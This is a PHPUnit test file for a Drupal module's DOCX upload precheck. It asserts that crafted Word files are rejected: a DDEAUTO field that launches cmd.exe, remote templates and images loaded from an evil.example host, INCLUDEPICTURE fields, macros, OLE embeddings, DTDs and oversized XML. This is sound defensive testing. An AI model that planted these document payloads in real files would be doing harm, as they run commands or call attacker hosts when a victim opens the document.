<?php

declare(strict_types=1);

namespace Drupal\Tests\beantragt_docgen\Unit;

use Drupal\beantragt_docgen\Docx\DocxPrecheck;
use Drupal\beantragt_docgen\Docx\DocxWriter;
use Drupal\beantragt_docgen\Exception\DocgenApiException;
use Drupal\beantragt_docgen\Service\FormTemplates;
use Drupal\Tests\UnitTestCase;
use PHPUnit\Framework\Attributes\Group;

/**
 * First check of uploaded Word files and the generated DOCX.
 */
#[Group('beantragt_docgen')]
final class DocxPrecheckTest extends UnitTestCase {

  /**
   * Generated documents are valid and stable.
   */
  public function testWriterOutputPassesAndIsDeterministic(): void {
    $blocks = [
      'Hallo {name}',
      ['table' => [['A', 'B'], ['{#x}{a}', '{b}{/x}']]],
    ];
    $bytes = DocxWriter::build($blocks);
    DocxPrecheck::assertDocx($bytes);
    self::assertSame(hash('sha256', $bytes), hash('sha256', DocxWriter::build($blocks)));
    DocxPrecheck::assertDocx(FormTemplates::baseTemplate());
    $xml = $this->part($bytes, 'word/document.xml');
    self::assertStringContainsString('Hallo {name}', $xml);
    self::assertStringContainsString('<w:tbl>', $xml);
  }

  /**
   * Wrong files are rejected with a specific code.
   */
  public function testRejections(): void {
    $this->assertRejected('not a zip file at all, just text', 'docgen.docx_invalid');
    $this->assertRejected(str_repeat('A', DocxPrecheck::MAX_BYTES + 1), 'docgen.docx_too_large');
    $docm = $this->rebuild(DocxWriter::build(['x']), ['[Content_Types].xml' => fn (string $xml): string => str_replace('document.main+xml', 'document.macroEnabled.main+xml', $xml)]);
    $this->assertRejected($docm, 'docgen.docx_macro');
    $vba = $this->rebuild(DocxWriter::build(['x']), [], ['word/vbaProject.bin' => 'macro']);
    $this->assertRejected($vba, 'docgen.docx_macro');
    $ole = $this->rebuild(DocxWriter::build(['x']), [], ['word/embeddings/oleObject1.bin' => 'ole']);
    $this->assertRejected($ole, 'docgen.docx_forbidden_content');
    $chunk = $this->rebuild(DocxWriter::build(['x']), ['word/_rels/document.xml.rels' => fn (string $xml): string => str_replace('</Relationships>', '<Relationship Id="c1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="c.html"/></Relationships>', $xml)]);
    $this->assertRejected($chunk, 'docgen.docx_forbidden_content');
    $no_document = $this->rebuild(DocxWriter::build(['x']), [], [], ['word/document.xml']);
    $this->assertRejected($no_document, 'docgen.docx_invalid');
  }

  /**
   * XML beyond docgen's 4 MiB budget is refused before any DOM is built.
   *
   * A ZIP of a few hundred KB can carry tens of MB of small XML elements;
   * the PHP process must not parse it.
   */
  public function testXmlBudgetIsCheckedBeforeParsing(): void {
    // Hex text compresses about 2:1, so the per-entry ratio check (which a
    // repetitive filler would trip first) stays out of the way.
    $text = static fn (int $bytes): string => bin2hex(random_bytes(intdiv($bytes, 2)));
    $paragraph = static fn (int $bytes): string => '<w:p><w:r><w:t>' . $text($bytes) . '</w:t></w:r></w:p>';
    $base = DocxWriter::build(['x']);
    $xml_size = 0;
    $parts = [
      '[Content_Types].xml',
      '_rels/.rels',
      'word/document.xml',
      'word/_rels/document.xml.rels',
      'word/styles.xml',
      'docProps/core.xml',
      'docProps/app.xml',
      'word/settings.xml',
    ];
    foreach ($parts as $name) {
      $xml_size += strlen($this->part($base, $name));
    }

    // Just below the budget across all parts: accepted.
    $ok = $this->rebuild($base, ['word/document.xml' => fn (string $xml): string => str_replace('</w:body>', $paragraph(DocxPrecheck::MAX_XML_BYTES - $xml_size - 4096) . '</w:body>', $xml)]);
    DocxPrecheck::assertDocx($ok);

    // One part over the budget, in a ZIP well below the upload limit.
    $big = $this->rebuild($base, ['word/document.xml' => fn (string $xml): string => str_replace('</w:body>', $paragraph(DocxPrecheck::MAX_XML_BYTES) . '</w:body>', $xml)]);
    self::assertLessThan(DocxPrecheck::MAX_BYTES, strlen($big));
    $this->assertRejectedFor($big, 'docgen.docx_invalid', 'xml_too_large');

    // Two parts that only together exceed it, one without an .xml name
    // (counted by its first bytes, like docgen).
    $half = '<?xml version="1.0"?><x>' . $text(intdiv(DocxPrecheck::MAX_XML_BYTES, 2)) . '</x>';
    $split = $this->rebuild($base, [], ['customXml/item1.xml' => $half, 'customXml/item2.bin' => $half]);
    $this->assertRejectedFor($split, 'docgen.docx_invalid', 'xml_too_large');
  }

  /**
   * Content that makes Word load or run outside content is rejected.
   *
   * Parity with docgen's guard for uploads Drupal stores and serves as is:
   * external relationships in any .rels part, forbidden relationship types,
   * DTDs and field codes in any XML part, simple and complex fields.
   */
  public function testOutsideContentIsRejectedInEveryPart(): void {
    $base = DocxWriter::build(['Bescheid {name}']);
    $w = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
    $rels = static fn (string $relationship): string => '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' . $relationship . '</Relationships>';

    // attachedTemplate on a foreign server, in settings.xml.rels.
    $template = $this->rebuild($base, [], ['word/_rels/settings.xml.rels' => $rels('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>')]);
    $this->assertRejectedFor($template, 'docgen.docx_forbidden_content', 'relationship_type');

    // An image loaded from outside when the header opens.
    $image = $this->rebuild($base, [], ['word/_rels/header1.xml.rels' => $rels('<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://evil.example/pixel.png" TargetMode="External"/>')]);
    $this->assertRejectedFor($image, 'docgen.docx_forbidden_content', 'external_relationship');

    // subDocument and frame, even as internal targets.
    $sub = $this->rebuild($base, [], ['word/_rels/footnotes.xml.rels' => $rels('<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" Target="sub.docx"/>')]);
    $this->assertRejectedFor($sub, 'docgen.docx_forbidden_content', 'relationship_type');

    // A hyperlink only opens on a click and stays accepted.
    $link = $this->rebuild($base, [], ['word/_rels/footer1.xml.rels' => $rels('<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.musterstadt.de" TargetMode="External"/>')]);
    DocxPrecheck::assertDocx($link);

    // DDEAUTO as a simple field.
    $dde = $this->rebuild($base, ['word/document.xml' => fn (string $xml): string => str_replace('</w:body>', '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/c calc&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body>', $xml)]);
    $this->assertRejectedFor($dde, 'docgen.docx_forbidden_content', 'field_code');

    // DDE split across two instrText runs of a complex field.
    $split = $this->rebuild($base, ['word/document.xml' => fn (string $xml): string => str_replace('</w:body>', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r><w:r><w:instrText>EAUTO cmd</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>', $xml)]);
    $this->assertRejectedFor($split, 'docgen.docx_forbidden_content', 'field_code');

    // INCLUDEPICTURE in a header part, with another namespace prefix.
    $header = '<?xml version="1.0" encoding="UTF-8"?><x:hdr xmlns:x="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><x:p><x:r><x:fldChar x:fldCharType="begin"/></x:r><x:r><x:instrText>INCLUDEPICTURE "https://evil.example/a.png" \\d</x:instrText></x:r><x:r><x:fldChar x:fldCharType="end"/></x:r></x:p></x:hdr>';
    $this->assertRejectedFor($this->rebuild($base, [], ['word/header1.xml' => $header]), 'docgen.docx_forbidden_content', 'field_code');

    // Harmless fields such as PAGE stay accepted.
    $page = $this->rebuild($base, [], ['word/footer1.xml' => '<?xml version="1.0" encoding="UTF-8"?><w:ftr ' . $w . '><w:p><w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p></w:ftr>']);
    DocxPrecheck::assertDocx($page);

    // A DTD in any XML part.
    $dtd = $this->rebuild($base, [], ['word/footnotes.xml' => '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "a">]><w:footnotes ' . $w . '/>']);
    $this->assertRejectedFor($dtd, 'docgen.docx_forbidden_content', 'dtd');

    // A macro-enabled template declared next to the document.
    $dotm = $this->rebuild($base, ['[Content_Types].xml' => fn (string $xml): string => str_replace('</Types>', '<Override PartName="/word/glossary/document.xml" ContentType="application/vnd.ms-word.template.macroEnabledTemplate.main+xml"/></Types>', $xml)]);
    $this->assertRejected($dotm, 'docgen.docx_macro');
  }

  /**
   * Asserts a rejection code and reason.
   */
  private function assertRejectedFor(string $bytes, string $code, string $reason): void {
    try {
      DocxPrecheck::assertDocx($bytes);
      self::fail('Accepted a file that must be rejected: ' . $reason);
    }
    catch (DocgenApiException $exception) {
      self::assertSame($code, $exception->errorCode);
      self::assertSame($reason, $exception->details['reason'] ?? NULL);
    }
  }

  /**
   * Asserts a rejection code.
   *
   * @param string $bytes
   *   The upload.
   * @param string $code
   *   The expected error code.
   */
  private function assertRejected(string $bytes, string $code): void {
    try {
      DocxPrecheck::assertDocx($bytes);
      self::fail('Accepted a file that must be rejected: ' . $code);
    }
    catch (DocgenApiException $exception) {
      self::assertSame($code, $exception->errorCode);
    }
  }

  /**
   * Reads one part of a DOCX.
   */
  private function part(string $bytes, string $name): string {
    $path = tempnam(sys_get_temp_dir(), 'docx');
    file_put_contents($path, $bytes);
    $zip = new \ZipArchive();
    $zip->open($path);
    $content = (string) $zip->getFromName($name);
    $zip->close();
    unlink($path);
    return $content;
  }

  /**
   * Rewrites parts of a DOCX, adds and removes entries.
   *
   * @param string $bytes
   *   The DOCX.
   * @param array<string, callable> $changes
   *   Part name => transformation.
   * @param array<string, string> $add
   *   Entries to add.
   * @param string[] $remove
   *   Entries to remove.
   */
  private function rebuild(string $bytes, array $changes, array $add = [], array $remove = []): string {
    $path = tempnam(sys_get_temp_dir(), 'docx');
    file_put_contents($path, $bytes);
    $zip = new \ZipArchive();
    $zip->open($path);
    foreach ($changes as $name => $change) {
      $zip->addFromString($name, $change((string) $zip->getFromName($name)));
    }
    foreach ($add as $name => $content) {
      $zip->addFromString($name, $content);
    }
    foreach ($remove as $name) {
      $zip->deleteName($name);
    }
    $zip->close();
    $result = (string) file_get_contents($path);
    unlink($path);
    return $result;
  }

}
